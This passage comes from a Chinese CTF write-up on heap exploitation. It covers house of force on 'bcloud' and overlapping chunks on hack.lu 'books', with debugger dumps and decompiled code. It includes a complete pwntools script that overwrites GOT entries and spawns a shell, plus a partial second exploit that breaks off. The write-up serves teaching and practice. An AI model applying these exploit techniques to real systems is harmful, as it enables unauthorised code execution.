class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>好吧，其实这里还是细心才能看到的漏洞，我们发现<code>strcpy(_org, &amp;org);</code>这里其实是会把<code>org+_org+host</code>的数据全部copy到堆上，实事上我们可以调试发现，<code>host</code>的数据正好覆盖了top chunk的size，也就是<code>wildness</code>，这里我们修改为<code>0xffffffff</code></p>\n<p>覆盖前：<br><figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a098</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0a8</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0b8</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0c8</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0d8</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00020e71</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0e8</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div></pre></td></tr></table></figure></p>\n<p>覆盖后：<br><figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; x/<span class=\"number\">40w</span>x <span class=\"number\">0</span>x<span class=\"number\">945a098</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a098</span>:\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0a8</span>:\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0b8</span>:\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0c8</span>:\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0d8</span>:\t<span class=\"number\">0</span>x<span class=\"number\">0945a098</span>\t<span class=\"number\">0</span>xffffffff\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0e8</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div></pre></td></tr></table></figure></p>\n<p>我们发现<code>0x945a0d8</code>这行的值被修改为我们想要的<code>0xffffffff</code>了。</p>\n<p>这题能够通过<code>house of force</code>来解决。</p>\n<p>我实现的步骤：</p>\n<ol>\n<li>leak name_addr 的堆地址，并通过计算得到top chunk的地址</li>\n<li>修改wildness为<code>0xffffffff(-1)</code></li>\n<li>分配一个大小为<code>wanted_addr - top_chunk_addr</code>堆块， 此时再分配得到的堆块即在<code>wanted_addr</code>地址上，我们就可以操纵这里的数据了</li>\n<li>修改此处的堆块数据，覆盖<code>content_addr[]</code>为<code>free_got, read_got, atoi_got</code></li>\n<li><code>edit()</code>id0的结构，修改<code>free_got</code>为<code>printf</code></li>\n<li><code>delete()</code>id1，泄露<code>read</code>的地址</li>\n<li><code>edit()</code>id2， 修改<code>atoi</code>为<code>system</code></li>\n<li>getshell</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">context(log_level = <span class=\"string\">'critical'</span>)</div><div class=\"line\"></div><div class=\"line\">p = process(<span class=\"string\">'./bcloud'</span>)</div><div class=\"line\">elf = ELF(<span class=\"string\">'./bcloud'</span>)</div><div class=\"line\">libc = ELF(<span class=\"string\">'/lib32/libc.so.6'</span>)</div><div class=\"line\"></div><div class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</div><div class=\"line\">read_got = elf.got[<span class=\"string\">'read'</span>]</div><div class=\"line\">free_got = elf.got[<span class=\"string\">'free'</span>]</div><div class=\"line\">printf_plt = elf.plt[<span class=\"string\">'printf'</span>]</div><div class=\"line\"></div><div class=\"line\">bss = <span class=\"number\">0x0804B060</span></div><div class=\"line\">content_length = <span class=\"number\">0x0804b0a0</span></div><div class=\"line\">content_addr = <span class=\"number\">0x804B120</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">new</span><span class=\"params\">(length, content)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'&gt;&gt;\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'content:\\n'</span>)</div><div class=\"line\">    p.sendline(str(length))</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'content:\\n'</span>)</div><div class=\"line\">    p.sendline(content)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index, content)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'&gt;&gt;\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'id:\\n'</span>)</div><div class=\"line\">    p.sendline(str(index))</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'content:\\n'</span>)</div><div class=\"line\">    p.sendline(content)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'success.\\n'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak_overwrite_wildness</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'name:\\n'</span>)</div><div class=\"line\"><span class=\"comment\">#   raw_input()</span></div><div class=\"line\">    p.send(<span class=\"string\">'a'</span> * (<span class=\"number\">0x40</span> - <span class=\"number\">1</span>) + <span class=\"string\">'b'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'b'</span>)</div><div class=\"line\">    addr = p.recv(<span class=\"number\">4</span>)</div><div class=\"line\">    p.recvline()</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Org:\\n'</span>)</div><div class=\"line\">    p.send(<span class=\"string\">'a'</span> * <span class=\"number\">0x40</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Host:\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'\\xff\\xff\\xff\\xff'</span>)</div><div class=\"line\">    <span class=\"keyword\">return</span> u32(addr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\"><span class=\"comment\">#   leak name_heap_addr </span></div><div class=\"line\">    name_heap_addr = leak_overwrite_wildness()</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'name_heap =&gt; '</span>, hex(name_heap_addr - <span class=\"number\">0x08</span>)</div><div class=\"line\">    base_heap = name_heap_addr + <span class=\"number\">0xd0</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'base_heap =&gt; '</span>, hex(base_heap)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#   malloc a gabage chunk to bss</span></div><div class=\"line\">    offset = bss - base_heap + <span class=\"number\">0x30</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'offset =&gt; '</span>, offset</div><div class=\"line\">    new(offset, <span class=\"string\">'abcdabcd'</span>) <span class=\"comment\"># id0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#   malloc a chunk on bss of free and overwrite content_length[] &amp; content_addr[]</span></div><div class=\"line\">    payload = <span class=\"string\">''</span></div><div class=\"line\">    payload += p32(<span class=\"number\">4</span>)</div><div class=\"line\">    payload += p32(<span class=\"number\">4</span>)</div><div class=\"line\">    payload += p32(<span class=\"number\">4</span>)</div><div class=\"line\">    payload += (content_addr - content_length - len(payload)) * <span class=\"string\">'\\x00'</span></div><div class=\"line\">    payload += p32(free_got)  <span class=\"comment\"># id0</span></div><div class=\"line\">    payload += p32(read_got)  <span class=\"comment\"># id1</span></div><div class=\"line\">    payload += p32(atoi_got)  <span class=\"comment\"># id2</span></div><div class=\"line\">    new(<span class=\"string\">'168'</span>, payload)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#   overwrite free_got with printf_plt</span></div><div class=\"line\">    edit(<span class=\"number\">0</span>, p32(printf_plt))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#   '4.Delete' to printf libc to get system_addr</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'&gt;&gt;\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'4'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'id:\\n'</span>)</div><div class=\"line\">    p.sendline(str(<span class=\"number\">1</span>))</div><div class=\"line\">    read_addr = u32(p.recv(<span class=\"number\">4</span>))</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'read_addr =&gt; '</span>, read_addr</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#   modify atoi to system</span></div><div class=\"line\">    libc.address = read_addr - libc.symbols[<span class=\"string\">'read'</span>]</div><div class=\"line\">    system_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">    payload2 = p32(system_addr)</div><div class=\"line\">    edit(<span class=\"number\">2</span>, payload2)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#   getshell</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'&gt;&gt;\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'/bin/sh\\n'</span>)</div><div class=\"line\">    p.interactive()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    main()</div></pre></td></tr></table></figure>\n<h2 id=\"0x09-overlapping-chunks\"><a href=\"#0x09-overlapping-chunks\" class=\"headerlink\" title=\"0x09 overlapping chunks\"></a>0x09 overlapping chunks</h2><p>除了how2heap上演示的extend freed chunks，参考了这篇<a href=\"http://blog.dazzlepppp.cn/2016/10/15/Producing-Overlapping-Chunks/\" target=\"_blank\" rel=\"external\">文章</a>后面的内容。</p>\n<p>堆块重叠指两块不同的堆块存在重叠部分，以至于我们写任意一块时也会覆写到另一块堆块中。<br>how2heap给出的演示程序中的意思是，当我们修改了一个已经被free了的chunk的size时，我们再次分配就可以得到一个修改后size的堆块，然后就可以构成堆块重叠，修改当前堆块将会修改到后一个堆块。</p>\n<p>查阅资料的过程中发现还可以在free之前修改size的大小，但是实际测试会发现在free的时候会崩溃，暂时没有找到原因。</p>\n<p>以how2heap例题2015hack.lu的books为例。</p>\n<p>存在明显的堆溢出，程序逻辑如下<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">signed</span> __int64 __<span class=\"function\">fastcall <span class=\"title\">main</span><span class=\"params\">(__int64 a1, <span class=\"keyword\">char</span> **a2, <span class=\"keyword\">char</span> **a3)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">signed</span> __int64 result; <span class=\"comment\">// rax@4</span></div><div class=\"line\">  __int64 v4; <span class=\"comment\">// rcx@16</span></div><div class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [sp+4h] [bp-BCh]@5</span></div><div class=\"line\">  <span class=\"keyword\">void</span> *final_str; <span class=\"comment\">// [sp+8h] [bp-B8h]@0</span></div><div class=\"line\">  <span class=\"keyword\">void</span> *order1; <span class=\"comment\">// [sp+18h] [bp-A8h]@1</span></div><div class=\"line\">  <span class=\"keyword\">void</span> *order2; <span class=\"comment\">// [sp+20h] [bp-A0h]@1</span></div><div class=\"line\">  <span class=\"keyword\">char</span> *dest; <span class=\"comment\">// [sp+28h] [bp-98h]@1</span></div><div class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [sp+30h] [bp-90h]@6</span></div><div class=\"line\">  __int64 v11; <span class=\"comment\">// [sp+B8h] [bp-8h]@1</span></div><div class=\"line\"></div><div class=\"line\">  v11 = *MK_FP(__FS__, <span class=\"number\">40L</span>L);</div><div class=\"line\">  order1 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x80</span>uLL);</div><div class=\"line\">  order2 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x80</span>uLL);</div><div class=\"line\">  dest = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x80</span>uLL);</div><div class=\"line\">  <span class=\"keyword\">if</span> ( order1 &amp;&amp; order2 &amp;&amp; dest )</div><div class=\"line\">  &#123;</div><div class=\"line\">    v5 = <span class=\"number\">0</span>;</div><div class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\" Crappiest and most expensive books for your college education!\\n\\nWe can order books for you in case they're not in stock.\\nMax. two orders allowed!\\n\"</span>);</div><div class=\"line\">    <span class=\"keyword\">while</span> (</div><div class=\"line\">    &#123;</div><div class=\"line\">      <span class=\"keyword\">if</span> ( v5 )</div><div class=\"line\">      &#123;</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\"</span>, final_str);</div><div class=\"line\">        <span class=\"built_in\">printf</span>(dest);                           <span class=\"comment\">// fsb</span></div><div class=\"line\">        result = <span class=\"number\">0L</span>L;</div><div class=\"line\">        <span class=\"keyword\">goto</span> finish;</div><div class=\"line\">      &#125;</div><div class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"1: Edit order 1\"</span>);</div><div class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"2: Edit order 2\"</span>);</div><div class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"3: Delete order 1\"</span>);</div><div class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"4: Delete order 2\"</span>);</div><div class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"5: Submit\"</span>);</div><div class=\"line\">      fgets(&amp;s, <span class=\"number\">128</span>, <span class=\"built_in\">stdin</span>);</div><div class=\"line\">      <span class=\"keyword\">switch</span> ( s )</div><div class=\"line\">      &#123;</div><div class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">'1'</span>:</div><div class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">\"Enter first order:\"</span>);</div><div class=\"line\">          edit((__int64)order1);</div><div class=\"line\">          <span class=\"built_in\">strcpy</span>(dest, <span class=\"string\">\"Your order is submitted!\\n\"</span>);</div><div class=\"line\">          <span class=\"keyword\">continue</span>;</div><div class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">'2'</span>:</div><div class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">\"Enter second order:\"</span>);</div><div class=\"line\">          edit((__int64)order2);</div><div class=\"line\">          <span class=\"built_in\">strcpy</span>(dest, <span class=\"string\">\"Your order is submitted!\\n\"</span>);</div><div class=\"line\">          <span class=\"keyword\">continue</span>;</div><div class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">'3'</span>:</div><div class=\"line\">          <span class=\"keyword\">delete</span>(order1);</div><div class=\"line\">          <span class=\"keyword\">continue</span>;</div><div class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">'4'</span>:</div><div class=\"line\">          <span class=\"keyword\">delete</span>(order2);</div><div class=\"line\">          <span class=\"keyword\">continue</span>;</div><div class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">'5'</span>:</div><div class=\"line\">          final_str = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x140</span>uLL);</div><div class=\"line\">          <span class=\"keyword\">if</span> ( !final_str )</div><div class=\"line\">          &#123;</div><div class=\"line\">            fwrite(<span class=\"string\">\"Something failed!\\n\"</span>, <span class=\"number\">1u</span>LL, <span class=\"number\">0x12</span>uLL, <span class=\"built_in\">stderr</span>);</div><div class=\"line\">            result = <span class=\"number\">1L</span>L;</div><div class=\"line\">            <span class=\"keyword\">goto</span> finish;</div><div class=\"line\">          &#125;</div><div class=\"line\">          submit((__int64)final_str, (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)order1, (<span class=\"keyword\">char</span> *)order2);</div><div class=\"line\">          v5 = <span class=\"number\">1</span>;</div><div class=\"line\">          <span class=\"keyword\">break</span>;</div><div class=\"line\">        <span class=\"keyword\">default</span>:</div><div class=\"line\">          <span class=\"keyword\">continue</span>;</div><div class=\"line\">      &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div><div class=\"line\">  fwrite(<span class=\"string\">\"Something failed!\\n\"</span>, <span class=\"number\">1u</span>LL, <span class=\"number\">0x12</span>uLL, <span class=\"built_in\">stderr</span>);</div><div class=\"line\">  result = <span class=\"number\">1L</span>L;</div><div class=\"line\">finish:</div><div class=\"line\">  v4 = *MK_FP(__FS__, <span class=\"number\">40L</span>L) ^ v11;</div><div class=\"line\">  <span class=\"keyword\">return</span> result;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>我们发现在<code>submit</code>函数这里存在溢出，我们通过修改已经free的chunk2的size为0x151这样在我们malloc是就会得到这款内存，进而在<code>submit</code>函数中溢出<code>dest</code>，利用格式化字符串。</p>\n<p>但是还有一个问题，我们在格式化字符串之后没有再call任何函数，所以我们通过修改<code>.fini</code>section为<code>main</code>的地址，以再结束后再次运行到<code>main</code>，关于<code>.fini</code>的作用在<a href=\"http://l4u-00.jinr.ru/usoft/WWW/www_debian.org/Documentation/elf/node3.html\" target=\"_blank\" rel=\"external\">这篇</a>中提到了</p>\n<blockquote>\n<p>.fini<br>This section holds executable instructions that contribute to the process termination code. That is, when a program exits normally, the system arranges to execute the code in this section.<br>.init<br>This section holds executable instructions that contribute to the process initialization code. That is, when a program starts to run the system arranges to execute the code in this section before the main program entry point (called main in C programs).</p>\n</blockquote>\n<p>总结来说，.fini是程序结束时的全局析构函数的地址，我们可以通过修改这个来得到控制流。</p>\n<p>在程序刚开始的时候就malloc了三个连续的chunk，我们可以随意溢出，但是后面接着的<code>strcpy</code>会截断我们的溢出，以至于格式化字符串不能利用，于是我们只能利用<code>submit</code>这个还能输里面的<code>strcat</code>来溢出<code>dest</code>里的字符串来得到格式化字符串。</p>\n<p>所以思路如下：</p>\n<ol>\n<li>free掉chunk2</li>\n<li>溢出chunk1将chunk2修改为0x151，这样我们在submit的时候就会分配到这个位置</li>\n<li>submit溢出dest，利用格式化字符串修改free的低2位（其中1位需要猜，1/16概率），同时修改<code>.fini</code>为程序开始</li>\n<li>传入/bin/sh，得到shell</li>\n</ol>\n<p>由于我们只能控制eip两次，所以不能有泄露的步骤了，下面的exp是有泄露的步骤的，没有成功<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span> </div><div class=\"line\">local = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">global</span> p</div><div class=\"line\">context(arch=<span class=\"string\">'amd64'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> local:</div><div class=\"line\">    p = process(<span class=\"string\">'./books'</span>)</div><div class=\"line\">    libc =  ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> local <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, open(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./books'</span>)</div><div class=\"line\">free_got = elf.got[<span class=\"string\">'free'</span>]</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit1</span><span class=\"params\">(payload)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Submit\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'order:\\n'</span>)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit2</span><span class=\"params\">(payload)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Submit\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'order:\\n'</span>)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dele</span><span class=\"params\">(index)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Submit\\n'</span>)</div><div class=\"line\">    p.sendline(str(index + <span class=\"number\">2</span>))</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">submit</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Submit\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'5'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pwn</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    dele(<span 